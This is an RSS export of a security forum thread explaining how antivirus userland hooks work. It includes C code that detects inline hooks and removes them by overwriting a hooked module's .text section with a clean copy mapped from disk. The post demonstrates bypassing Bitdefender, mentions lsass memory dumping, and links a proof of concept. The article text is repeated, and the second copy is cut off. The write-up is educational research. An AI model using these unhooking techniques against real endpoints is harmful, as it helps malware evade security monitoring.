<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Defeating Userland Hooks (ft. Bitdefender)</title>
    <link>https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496</link>
    <description>It has been brought to my attention by @lkw of a recent Cylance bypass that would allow an application to dump memory from the _lsass.exe_ process. The [article](https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6) discusses the issues of userland hooks employed by the EDR to detect the use of the `ReadProcessMemory` Windows API function and how it is possible to develop such a bypass. In this article, I will be doing a technical dive into the internals of how anti-virus software monitors applications&#39; activity via these userland hooks and the problems associated with them to understand how trivial it may be to defeat them. Unlike the previously mentioned article, I will describe a method that will scale across all hooks within a process should it be desired.

If the reader is unfamiliar with what function hooking is, I have previously written a paper regarding this topic. It is recommended that one understands these fundamentals before continuing onwards as it will be assumed knowledge. The paper can be found [here](https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565).

**Disclaimer**: This article does not aim to specifically target Bitdefender but rather uses it as an example.

### Recommended Pre-requisites
* C/C++
* x86 Intel Assembly
* Windows API or internals
* PE file format
* Processes and memory management
* Function hooking

----

# Theory

## Why Userland Hooks?

Anti-virus software are trusted applications which operate under complete and total privilege in the kernel. Because of their position, they are able to control and monitor the entire landscape of the system by, for example, modifying system call tables to proxy calls to the Windows operating system allowing them to see all activity. If a userland application attempts to read a process&#39;s memory, anti-virus software can install a hook into the corresponding kernel function (`NtReadVirtualMemory`) that carries out that procedure and check its parameters before deciding either to disallow it or pass it onto the kernel to be completed.

With the introduction of Kernel Patch Protection (KPP), AKA Patch Guard, in recent 64-bit Windows OSes, Microsoft has severely tanked anti-virus software&#39;s control over what they can or cannot see and instead provide notification routines to allow kernel-mode drivers to register callback functions to receive events such as file IO or process creation. These routines are quite limited in that there does not exist notification routines for each and every possible action. Thus, for anti-virus to retain their ability to monitor applications, they may perform what is known as _userland hooking_. This kind of functionality is also utilised by malware known as _ring3 rootkits_ - their name given because of their ability to monitor and control applications&#39; behaviour in userland by code injection.

The dangers of shifting functionality from kernel to userland is that they are now on the same playing field as (non-rootkit) malware. Once this occurs, the anti-virus itself is susceptible to being compromised and may result in bypasses. Of course, the anti-virus should still exist within the kernel to some extent which does provide _some_ protection. For example, if the anti-virus inserts its own DLL into the space of applications, it cannot be removed because of its capabilities to monitor and control module unloading in the kernel. Likewise, anti-virus&#39;s critical files on disk or registry entries are also protected.

## Identifying Hooks

To be able to detect hooks, they must exist. If the anti-virus does not use hooks, there is nothing to do. Let&#39;s look at an example of how to identify a hooked application&#39;s process. Here we have an application that simply displays a message box.

![jpg|187x183](upload://lTjwVJGjT5B63JNMsDfkY8itnf7.png) 

If we take a look at its loaded modules, we can see _atcuf64.dll_ which has a description of _BitDefender Active Threat Control Usermode Filter_. This is what provides the  commonly known &quot;behavioural/real-time monitoring&quot; functionality of anti-virus software.

![jpg|516x500](upload://1jkqj4tDa3OJHBjttVeXdiwrBCy.png) 

Switching over to the memory view, we can see _RX_ memory pages that have no identifiable name or description. These usually contain shellcode that receive control of the instruction pointer when a function is hooked.

![jpg|543x430](upload://heVB5EZ9c6QhjTXigSy1q5CWliX.png) 

![jpg|558x430](upload://syl6VRC6feI2DHYMH8uIKKAOjX7.png) 

Let&#39;s attach a debugger onto the process and analyse what is happening under the hood. If we jump to a Windows API function, e.g. kernelbase&#39;s `CreateRemoteThreadEx`, we can see that there is an unusual relative jump to an unnamed section in memory. 

![jpg|690x70](upload://6ovWgTKFjiOG0IA20vs6tJviiBY.png) 

Here, it does an absolute jump to another address with an unnamed section in memory.

![jpg|599x65](upload://w8kfW0A9obQjbmzjmNEKdxBjuUp.png) 

Looking back to the memory view of the process, we can see that these address coincide with the _RX_ sections.

![jpg|690x387](upload://8HsZwZG32ubBmHdgcfc8sySmxCk.png) 

So let&#39;s follow the shellcode and see where we end up. Here, we can see a graph of shellcode at `0x20000`.

![jpg|690x424](upload://yPIGsLeEIybqnPTmJk97ao0otWU.png) 

On the right panel, there is a call into the _atcuf64.dll_ module. Let&#39;s follow it and take a look.

![jpg|690x426](upload://hFYttmSowXBONtLWVQtqCDhDDsX.png) 

For those who wish to analyse this themselves, they may do so themselves as it will be out of scope for this article.

So we&#39;ve identified that the anti-virus does indeed use userland hooks. Now that we know this, we can start looking to detect them.


## Detecting Hooks

In the example that we used above, we saw that `CreateRemoteThreadEx` was hooked in the _kernelbase.dll_ module but there are plenty more hooked functions in other modules as we will see later. We identified that a function was hooked because it had an instruction pointer redirect using a `jmp` instruction from the first byte of the function&#39;s address. Since (usually) the first couple of opcodes determines the instruction (in this case `E9` is a relative jump), we can read and compare them to see if they are instructions that control the instruction pointer. Another example of instruction pointer control is the shellcode that the hook in `CreateRemoteThreadEx` redirected to which contained a `push`/`ret` combination that would jump to the `push`ed value. There are many more such as `mov reg`/`jmp reg` and `call addr`. The [anticuckoo project on GitHub](https://github.com/David-Reguera-Garcia-Dreg/anticuckoo/blob/master/anticuckoo.cpp#L536) contains a set of these opcode patterns with which they can be matched to detect if hooks are present.

Here is an example of how this detection may be done.

```c
BOOL IsHooked(LPCVOID lpFuncAddress) {
    LPCBYTE lpBytePtr = (LPCBYTE)lpFuncAddress;

    if (lpBytePtr[0] == 0xE9) {
        return TRUE;
    } else if (lpBytePtr[0] == 0x68 &amp;&amp;  lpBytePtr[5] == 0xC3) {
        return TRUE;
    }

    return FALSE;
}
```

Using this `IsHooked` function with the address of `CreateRemoteThreadEx`, we read the first byte and compare it with the `0xE9` `jmp` opcode. If the condition is true, we can tell that it is hooked. We can do the same with the `push`/`ret` combination. The first byte `0x68` represents the `push` instruction. The bytes from position 1 to 4 represent the redirected address. `0xC3` represents the `ret` instruction.

### Following Hooks

Of course, there may be functions that naturally contain code redirection for legitimate purposes such as hot-patching. A method that may be used to check if a hook is legitimate is by seeing whether it redirects to a place in memory that is in the same module or if the two modules&#39; paths are the same. If not, it may be assumed that the hook redirects code execution to a third party entity such as an anti-virus. 

To be able to test if the hook is legitimate, we need to follow the address of the hook. A little modification to the `IsHooked` function can be done to allow this. It is also crucial to understand that these instruction pointer redirects come in different types, e.g. relative and absolute. Relative means that the jump is relative to its current position whereas absolute means that the given address is exactly the value given to the instruction pointer.

```c
HOOK_TYPE IsHooked(LPCVOID lpFuncAddress, DWORD_PTR *dwAddressOffset) {
    LPCBYTE lpBytePtr = (LPCBYTE)lpFuncAddress;

    if (lpBytePtr[0] == 0xE9) {
        *dwAddressOffset = 1;
        return HOOK_RELATIVE;    // E9 jmp is relative.
    } else if (lpBytePtr[0] == 0x68 &amp;&amp;  lpBytePtr[5] == 0xC3) {
        *dwAddressOffset = 1;
        return HOOK_ABOLSUTE;    // push/ret is absolute.
    }

    return HOOK_NONE;            // No hook.
}
```

In both scenarios, the offset from the function&#39;s first byte is 1. Let&#39;s take a look at an example of the `E9` `jmp`:

```makefile
jmp opcode
|
v
E9 1C 29 FF FF
   ^
   |
   Redirected address
```

and the `push`/`ret` hook:

```makefile
push opcode    ret opcode
|              |
v              v
68 DD CC BB AA C3
   ^
   |
   Redirected address
```

We can now extract the address and then resolve it with some pointer gymnastics:

```c
LPVOID lpFunction = ...;
DWORD_PTR dwOffset = 0;
LPVOID dwHookAddress = 0;

HOOK_TYPE ht = IsHooked(lpFunction, &amp;dwOffset);
if (ht == HOOK_ABSOLUTE) {
    // 1. Get the pointer to the address (lpFunction + dwOffset)
    // 2. Cast it to a DWORD pointer
    // 3. Dereference it to get the DWORD value
    // 4. Cast it to a pointer
    dwHookAddress = (LPVOID)(*(LPDWORD)((LPBYTE)lpFunction + dwOffset));
} else if (ht == HOOK_RELATIVE) {
    // 1. Get the pointer to the address (lpFunction + dwOffset)
    // 2. Cast it to an INT pointer
    // 3. Dereference it to get the INT value (this can be negative)
    INT nJumpSize = (*(PINT)((LPBYTE)lpFunction  + dwOffset);
    // 4. E9 jmp starts from the address AFTER the jmp instruction
    DWORD_PTR dwRelativeAddress = (DWORD_PTR)((LPBYTE)lpFunction + dwOffset + 4));
    // 5. Add the relative address and jump size
    dwHookAddress = (LPVOID)(dwRelativeAddress + nJumpSize);
}
```

### Checking Legitimacy of Hooks

After obtaining the address, we can get more information about it such as memory page details and module name (if there are any). The [`VirtualQuery`](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualquery) function provides this functionality and the returned information can be used to check if the hook and the function are in the same module.

```c
MEMORY_BASIC_INFORMATION mbi;
VirtualQuery(
    dwHookAddress,                    // Pointer to the base address.
                                      // The value is actually rounded down
                                      // to the page boundary.
    &amp;mbi,                             // Pointer to MEMORY_BASIC_INFORMATION.
    sizeof(MEMORY_BASIC_INFORMATION)
);

// hModule is the handle to the module that we are checking for hooks.
if (mbi.AllocationBase == (PVOID)hModule) {
    // Same module, assume safe.
}

// If we get here, it could be hooked!
```

## Unhooking Hooks

Once we can detect hooks, all that is left to do is to unhook them. The idea is simple: replace the hooked modules with their original code. Let&#39;s look at how this can be achieved.

### 1. Obtaining the Original Code

The clean, original code can be found in the file on disk. We can get a handle to the file and then map it into the process space. 

```makefile
Mapping the new module with clean code

                 +---- +-------------+          +-------------+
                /      |   Headers   |          |   Headers   |
               /       +-------------+          +-------------+
+-------------+        |    .text    |          |    .text    |
|   Headers   |        |   (clean)   |          |   (hooked)  |
+-------------+        |             |          |             |
|    .text    |        +-------------+          +-------------+
|   (clean)   |        |             |          |             |
+-------------+        |    .data    |          |    .data    |
|    .data    |        |             |          |             |
+-------------+        +-------------+          +-------------+
|     ...     |        |             |          |             |
+-------------+        |     ...     |          |     ...     |
|    .rsrc    |        |             |          |             |
+-------------+        +-------------+          +-------------+
               \       |    .rsrc    |          |    .rsrc    |
                \      |             |          |             |
                 +---- +-------------+          +-------------+
     Clean                  Clean                   Hooked
 module (disk)          module (memory)         module (memory)
```

Here is example code that does this:

```c
// Get the file path in here.
CHAR szModuleFile[...];

// Get a handle to the file.
HANDLE hFile = CreateFile(
    szModuleFile,       // Pointer to the file path.
    GENERIC_READ,       // Read access.
    FILE_SHARE_READ,
    NULL,
    OPEN_EXISTING,      // File must exist.
    0,
    NULL
);

// Map the module.
HANDLE hFileMapping = CreateFileMapping(
    hFile,                       // Handle to the file.
    NULL,
    PAGE_READONLY | SEC_IMAGE,   // Map it as an executable image.
    0,
    0,
    NULL
);

LPVOID lpMapping = MapViewOfFile(
    hFileMapping,       // From above
    FILE_MAP_READ,      // Same map permissions as above.
    0,
    0,
    0
);
```

### 2. Removing the Hooks

The original code can be extracted from the mapped module and then copied into the existing module to cleanse the hooks.

```makefile
Replacing hooked code with clean code

                 +---- +-------------+          +-------------+
                /      |   Headers   |          |   Headers   |
               /       +-------------+ -------&gt; +-------------+
+-------------+        |    .text    |          |    .text    |
|   Headers   |        |   (clean)   |  memcpy  |   (clean)   |
+-------------+        |             |          |             |
|    .text    |        +-------------+ -------&gt; +-------------+
|   (clean)   |        |             |          |             |
+-------------+        |    .data    |          |    .data    |
|    .data    |        |             |          |             |
+-------------+        +-------------+          +-------------+
|     ...     |        |             |          |             |
+-------------+        |     ...     |          |     ...     |
|    .rsrc    |        |             |          |             |
+-------------+        +-------------+          +-------------+
               \       |    .rsrc    |          |    .rsrc    |
                \      |             |          |             |
                 +---- +-------------+          +-------------+
     Clean                  Clean                   Cleaned
 module (disk)          module (memory)         module (memory)
```

Here is example code that performs this:

```c
// Parse the PE headers.
PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)lpMapping;
PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpMapping + pidh-&gt;e_lfanew);

// Walk the section headers and find the .text section.
for (WORD i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
    if (!strcmp(pish-&gt;Name, &quot;.text&quot;)) {
        // Deprotect the module&#39;s memory region for write permissions.
        DWORD flProtect = ProtectMemory(
            (LPVOID)((DWORD_PTR)hModule + (DWORD_PTR)pish-&gt;VirtualAddress),    // Address to protect.
            pish-&gt;Misc.VirtualSize,                        // Size to protect.
            PAGE_EXECUTE_READWRITE                         // Desired protection.
        );

        // Replace the hooked module&#39;s .text section with the newly mapped module&#39;s.
        memcpy(
            (LPVOID)((DWORD_PTR)hModule + (DWORD_PTR)pish-&gt;VirtualAddress),
            (LPVOID)((DWORD_PTR)lpMapping + (DWORD_PTR)pish-&gt;VirtualAddress),
            pish-&gt;Misc.VirtualSize
        );

        // Reprotect the module&#39;s memory region.
        flProtect = ProtectMemory(
            (LPVOID)((DWORD_PTR)hModule + (DWORD_PTR)pish-&gt;VirtualAddress),    // Address to protect.
            pish-&gt;Misc.VirtualSize,                        // Size to protect.
            flProtect                                      // Revert to old protection.
        );
    }
}
```

Of course, doing this can be dangerous. For example, in the case there the application is multi-threaded and utilising the modules&#39; functions, race conditions will arise while the code is part-way being replaced and being executed at the same time. In this situation, suspending all other threads may be advised.

----

# Demonstration

I&#39;ve discovered two hooked functions that trigger Bitdefender&#39;s real-time monitoring functionality. Both show the raw execution of the functions and then Bitdefender detecting, blocking, and deleting the threats. The AntiHook PoC was then called to remove the hooks before performing the same action to show the bypassing of Bitdefender.

## CreateRemoteThread

(on external process)

&lt;img src=&#39;//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/0/032246a3baf3a9b73872ef42f011c12710fd5a84.gif&#39;&gt;

## DebugActiveProcess

(on cmd.exe)

&lt;img src=&#39;//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/0/000d8286f8a2d28c82a884e110bf24a7a81e554a.gif&#39;&gt;

----

# Conclusion

As we&#39;ve seen, userland hooks are flawed in that they that allow malware to fight anti-virus software on equal ground. Although they increase the field of view for monitoring activity, they are potentially a trivial nuisance that can be sidestepped by sufficiently-equipped malware. Anti-virus using this technique should move away and develop something that is more robust as other non-userland-hooking solutions have done but I cannot say whether or not they are more or as effective.

Apologies for the very quick and rough article as I don&#39;t have much time to dedicate towards writing right now. Hope that you&#39;ve appreciated and learned something from this.

As always, the project is available on [GitHub - https://github.com/NtRaiseHardError/AntiHook](https://github.com/NtRaiseHardError/AntiHook).

-- _dtm_</description>
    
    <lastBuildDate>Mon, 15 Apr 2019 08:52:44 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Defeating Userland Hooks (ft. Bitdefender)</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496/4</link>
        <pubDate>Tue, 23 Apr 2019 04:38:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12496-4</guid>
        <source url="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496.rss">Defeating Userland Hooks (ft. Bitdefender)</source>
      </item>
      <item>
        <title>Defeating Userland Hooks (ft. Bitdefender)</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>My Linux internals aren’t as good either but from what I know, I believe they operate in a similar fashion. The difference here is that the hooks are not within the IAT (PE’s “PLT/GOT”) but are deeper in the call hierarchy. Most of these hooks are placed in the functions that wrap the <code>syscall</code>s.</p>
          <p><a href="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496/3</link>
        <pubDate>Mon, 15 Apr 2019 08:52:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12496-3</guid>
        <source url="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496.rss">Defeating Userland Hooks (ft. Bitdefender)</source>
      </item>
      <item>
        <title>Defeating Userland Hooks (ft. Bitdefender)</title>
        <dc:creator><![CDATA[hunter]]></dc:creator>
        <description><![CDATA[
            <p>Very informative article, thanks! Mind if my question is trivial I’m still rather a noob in Windows internals; in dynamically linked ELF binaries, external functions consist of a jmp to a PLT/GOT entry so it’s a similar structure to what you have mentioned used in userland hooks. Doesn’t PE use that kind of method for dynamically linked libraries as well?</p>
          <p><a href="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496/2</link>
        <pubDate>Sun, 14 Apr 2019 08:36:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12496-2</guid>
        <source url="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496.rss">Defeating Userland Hooks (ft. Bitdefender)</source>
      </item>
      <item>
        <title>Defeating Userland Hooks (ft. Bitdefender)</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>It has been brought to my attention by <a class="mention" href="https://0x00sec.org/u/lkw">@lkw</a> of a recent Cylance bypass that would allow an application to dump memory from the <em>lsass.exe</em> process. The <a href="https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6">article</a> discusses the issues of userland hooks employed by the EDR to detect the use of the <code>ReadProcessMemory</code> Windows API function and how it is possible to develop such a bypass. In this article, I will be doing a technical dive into the internals of how anti-virus software monitors applications’ activity via these userland hooks and the problems associated with them to understand how trivial it may be to defeat them. Unlike the previously mentioned article, I will describe a method that will scale across all hooks within a process should it be desired.</p>
<p>If the reader is unfamiliar with what function hooking is, I have previously written a paper regarding this topic. It is recommended that one understands these fundamentals before continuing onwards as it will be assumed knowledge. The paper can be found <a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565">here</a>.</p>
<p><strong>Disclaimer</strong>: This article does not aim to specifically target Bitdefender but rather uses it as an example.</p>
<h3>Recommended Pre-requisites</h3>
<ul>
<li>C/C++</li>
<li>x86 Intel Assembly</li>
<li>Windows API or internals</li>
<li>PE file format</li>
<li>Processes and memory management</li>
<li>Function hooking</li>
</ul>
<hr>
<h1>Theory</h1>
<h2>Why Userland Hooks?</h2>
<p>Anti-virus software are trusted applications which operate under complete and total privilege in the kernel. Because of their position, they are able to control and monitor the entire landscape of the system by, for example, modifying system call tables to proxy calls to the Windows operating system allowing them to see all activity. If a userland application attempts to read a process’s memory, anti-virus software can install a hook into the corresponding kernel function (<code>NtReadVirtualMemory</code>) that carries out that procedure and check its parameters before deciding either to disallow it or pass it onto the kernel to be completed.</p>
<p>With the introduction of Kernel Patch Protection (KPP), AKA Patch Guard, in recent 64-bit Windows OSes, Microsoft has severely tanked anti-virus software’s control over what they can or cannot see and instead provide notification routines to allow kernel-mode drivers to register callback functions to receive events such as file IO or process creation. These routines are quite limited in that there does not exist notification routines for each and every possible action. Thus, for anti-virus to retain their ability to monitor applications, they may perform what is known as <em>userland hooking</em>. This kind of functionality is also utilised by malware known as <em>ring3 rootkits</em> - their name given because of their ability to monitor and control applications’ behaviour in userland by code injection.</p>
<p>The dangers of shifting functionality from kernel to userland is that they are now on the same playing field as (non-rootkit) malware. Once this occurs, the anti-virus itself is susceptible to being compromised and may result in bypasses. Of course, the anti-virus should still exist within the kernel to some extent which does provide <em>some</em> protection. For example, if the anti-virus inserts its own DLL into the space of applications, it cannot be removed because of its capabilities to monitor and control module unloading in the kernel. Likewise, anti-virus’s critical files on disk or registry entries are also protected.</p>
<h2>Identifying Hooks</h2>
<p>To be able to detect hooks, they must exist. If the anti-virus does not use hooks, there is nothing to do. Let’s look at an example of how to identify a hooked application’s process. Here we have an application that simply displays a message box.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/996e6019300f0f8021ba89d667c07b26e0c9093d.png" alt="jpg" data-base62-sha1="lTjwVJGjT5B63JNMsDfkY8itnf7" width="187" height="183"></p>
<p>If we take a look at its loaded modules, we can see <em>atcuf64.dll</em> which has a description of <em>BitDefender Active Threat Control Usermode Filter</em>. This is what provides the  commonly known “behavioural/real-time monitoring” functionality of anti-virus software.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/093188d21a664a6c5d562a76c9e39929ec2f4a92.png" alt="jpg" data-base62-sha1="1jkqj4tDa3OJHBjttVeXdiwrBCy" width="516" height="500"></p>
<p>Switching over to the memory view, we can see <em>RX</em> memory pages that have no identifiable name or description. These usually contain shellcode that receive control of the instruction pointer when a function is hooked.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/78d4fa31515a5923e1ae1ee73e64dd7a2874eddb.png" alt="jpg" data-base62-sha1="heVB5EZ9c6QhjTXigSy1q5CWliX" width="543" height="430"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c81ea079aca4ae5a04422da272047588a699640d.png" alt="jpg" data-base62-sha1="syl6VRC6feI2DHYMH8uIKKAOjX7" width="558" height="430"></p>
<p>Let’s attach a debugger onto the process and analyse what is happening under the hood. If we jump to a Windows API function, e.g. kernelbase’s <code>CreateRemoteThreadEx</code>, we can see that there is an unusual relative jump to an unnamed section in memory.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2cd278793a50359a756d8696c0a6975411d0177a.png" alt="jpg" data-base62-sha1="6ovWgTKFjiOG0IA20vs6tJviiBY" width="690" height="70"></p>
<p>Here, it does an absolute jump to another address with an unnamed section in memory.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e136873982e152587c44b2a1a340c66cf84ae4f9.png" alt="jpg" data-base62-sha1="w8kfW0A9obQjbmzjmNEKdxBjuUp" width="599" height="65"></p>
<p>Looking back to the memory view of the process, we can see that these address coincide with the <em>RX</em> sections.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3cfb4535363441f02debc5a19b852f750637023c.png" alt="jpg" data-base62-sha1="8HsZwZG32ubBmHdgcfc8sySmxCk" width="690" height="387"></p>
<p>So let’s follow the shellcode and see where we end up. Here, we can see a graph of shellcode at <code>0x20000</code>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f4229fcecdd696781307799adbdaf9551339c9f8.png" alt="jpg" data-base62-sha1="yPIGsLeEIybqnPTmJk97ao0otWU" width="690" height="424"></p>
<p>On the right panel, there is a call into the <em>atcuf64.dll</em> module. Let’s follow it and take a look.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7be3a76eba38ccddc76b64660aa408e8e308ba17.png" alt="jpg" data-base62-sha1="hFYttmSowXBONtLWVQtqCDhDDsX" width="690" height="426"></p>
<p>For those who wish to analyse this themselves, they may do so themselves as it will be out of scope for this article.</p>
<p>So we’ve identified that the anti-virus does indeed use userland hooks. Now that we know this, we can start looking to detect them.</p>
<h2>Detecting Hooks</h2>
<p>In the example that we used above, we saw that <code>CreateRemoteThreadEx</code> was hooked in the <em>kernelbase.dll</em> module but there are plenty more hooked functions in other modules as we will see later. We identified that a function was hooked because it had an instruction pointer redirect using a <code>jmp</code> instruction from the first byte of the function’s address. Since (usually) the first couple of opcodes determines the instruction (in this case <code>E9</code> is a relative jump), we can read and compare them to see if they are instructions that control the instruction pointer. Another example of instruction pointer control is the shellcode that the hook in <code>CreateRemoteThreadEx</code> redirected to which contained a <code>push</code>/<code>ret</code> combination that would jump to the <code>push</code>ed value. There are many more such as <code>mov reg</code>/<code>jmp reg</code> and <code>call addr</code>. The <a href="https://github.com/David-Reguera-Garcia-Dreg/anticuckoo/blob/master/anticuckoo.cpp#L536">anticuckoo project on GitHub</a> contains a set of these opcode patterns with which they can be matched to detect if hooks are present.</p>
<p>Here is an example of how this detection may be done.</p>
<pre><code class="lang-auto">BOOL IsHooked(LPCVOID lpFuncAddress) {
    LPCBYTE lpBytePtr = (LPCBYTE)lpFuncAddress;

    if (lpBytePtr[0] == 0xE9) {
        return TRUE;
    } else if (lpBytePtr[0] == 0x68 &amp;&amp;  lpBytePtr[5] == 0xC3) {
        return TRUE;
    }

    return FALSE;
}
</code></pre>
<p>Using this <code>IsHooked</code> function with the address of <code>CreateRemoteThreadEx</code>, we read the first byte and compare it with the <code>0xE9</code> <code>jmp</code> opcode. If the condition is true, we can tell that it is hooked. We can do the same with the <code>push</code>/<code>ret</code> combination. The first byte <code>0x68</code> represents the <code>push</code> instruction. The bytes from position 1 to 4 represent the redirected address. <code>0xC3</code> represents the <code>ret</code> instruction.</p>
<h3>Following Hooks</h3>
<p>Of course, there may be functions that naturally contain code redirection for legitimate purposes such as hot-patching. A method that may be used to check if a hook is legitimate is by seeing whether it redirects to a place in memory that is in the same module or if the two modules’ paths are the same. If not, it may be assumed that the hook redirects code execution to a third party entity such as an anti-virus.</p>
<p>To be able to test if the hook is legitimate, we need to follow the address of the hook. A little modification to the <code>IsHooked</code> function can be done to allow this. It is also crucial to understand that these instruction pointer redirects come in different types, e.g. relative and absolute. Relative means that the jump is relative to its current position whereas absolute means that the given address is exactly the value given to the instruction pointer.</p>
<pre><code class="lang-auto">HOOK_TYPE IsHooked(LPCVOID lpFuncAddress, DWORD_PTR *dwAddressOffset) {
    LPCBYTE lpBytePtr = (LPCBYTE)lpFuncAddress;

    if (lpBytePtr[0] == 0xE9) {
        *dwAddressOffset = 1;
        return HOOK_RELATIVE;    // E9 jmp is relative.
    } else if (lpBytePtr[0] == 0x68 &amp;&amp;  lpBytePtr[5] == 0xC3) {
        *dwAddressOffset = 1;
        return HOOK_ABOLSUTE;    // push/ret is absolute.
    }

    return HOOK_NONE;            // No hook.
}
</code></pre>
<p>In both scenarios, the offset from the function’s first byte is 1. Let’s take a look at an example of the <code>E9</code> <code>jmp</code>:</p>
<pre><code class="lang-makefile">jmp opcode
|
v
E9 1C 29 FF FF
   ^
   |
   Redirected address
</code></pre>
<p>and the <code>push</code>/<code>ret</code> hook:</p>
<pre><code class="lang-makefile">push opcode    ret opcode
|              |
v              v
68 DD CC BB AA C3
   ^
   |
   Redirected address
</code></pre>
<p>We can now extract the address and then resolve it with some pointer gymnastics:</p>
<pre><code class="lang-auto">LPVOID lpFunction = ...;
DWORD_PTR dwOffset = 0;
LPVOID dwHookAddress = 0;

HOOK_TYPE ht = IsHooked(lpFunction, &amp;dwOffset);
if (ht == HOOK_ABSOLUTE) {
    // 1. Get the pointer to the address (lpFunction + dwOffset)
    // 2. Cast it to a DWORD pointer
    // 3. Dereference it to get the DWORD value
    // 4. Cast it to a pointer
    dwHookAddress = (LPVOID)(*(LPDWORD)((LPBYTE)lpFunction + dwOffset));
} else if (ht == HOOK_RELATIVE) {
    // 1. Get the pointer to the address (lpFunction + dwOffset)
    // 2. Cast it to an INT pointer
    // 3. Dereference it to get the INT value (this can be negative)
    INT nJumpSize = (*(PINT)((LPBYTE)lpFunction  + dwOffset);
    // 4. E9 jmp starts from the address AFTER the jmp instruction
    DWORD_PTR dwRelativeAddress = (DWORD_PTR)((LPBYTE)lpFunction + dwOffset + 4));
    // 5. Add the relative address and jump size
    dwHookAddress = (LPVOID)(dwRelativeAddress + nJumpSize);
}
</code></pre>
<h3>Checking Legitimacy of Hooks</h3>
<p>After obtaining the address, we can get more information about it such as memory page details and module name (if there are any). The <a href="https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualquery"><code>VirtualQuery</code></a> function provides this functionality and the returned information can be used to check if the hook and the function are in the same module.</p>
<pre><code class="lang-auto">MEMORY_BASIC_INFORMATION mbi;
VirtualQuery(
    dwHookAddress,                    // Pointer to the base address.
                                      // The value is actually rounded down
                                      // to the page boundary.
    &amp;mbi,                             // Pointer to MEMORY_BASIC_INFORMATION.
    sizeof(MEMORY_BASIC_INFORMATION)
);

// hModule is the handle to the module that we are checking for hooks.
if (mbi.AllocationBase == (PVOID)hModule) {
    // Same module, assume safe.
}

// If we get here, it could be hooked!
</code></pre>
<h2>Unhooking Hooks</h2>
<p>Once we can detect hooks, all that is left to do is to unhook them. The idea is simple: replace the hooked modules with their original code. Let’s look at how this can be achieved.</p>
<h3>1. Obtaining the Original Code</h3>
<p>The clean, original code can be found in the file on disk. We can get a handle to the file and then map it into the process space.</p>
<pre><code class="lang-makefile">Mapping the new module with clean code

                 +---- +-------------+          +-------------+
                /      |   Headers   |          |   Headers   |
               /       +-------------+          +-------------+
+-------------+        |    .text    |          |    .text    |
|   Headers   |        |   (clean)   |          |   (hooked)  |
+-------------+        |             |          |             |
|    .text    |        +-------------+          +-------------+
|   (clean)   |        |             |          |             |
+-------------+        |    .data    |          |    .data    |
|    .data    |        |             |          |             |
+-------------+        +-------------+          +-------------+
|     ...     |        |             |          |             |
+-------------+        |     ...     |          |     ...     |
|    .rsrc    |        |             |          |             |
+-------------+        +-------------+          +-------------+
               \       |    .rsrc    |          |    .rsrc    |
                \      |             |          |             |
                 +---- +-------------+          +-------------+
     Clean                  Clean                   Hooked
 module (disk)          module (memory)         module (memory)
</code></pre>
<p>Here is example code that does this:</p>
<pre><code class="lang-auto">// Get the file path in here.
CHAR szModuleFile[...];

// Get a handle to the file.
HANDLE hFile = CreateFile(
    szModuleFile,       // Pointer to the file path.
    GENERIC_READ,       // Read access.
    FILE_SHARE_READ,
    NULL,
    OPEN_EXISTING,      // File must exist.
    0,
    NULL
);

// Map the module.
HANDLE hFileMapping = CreateFileMapping(
    hFile,                       // Handle to the file.
    NULL,
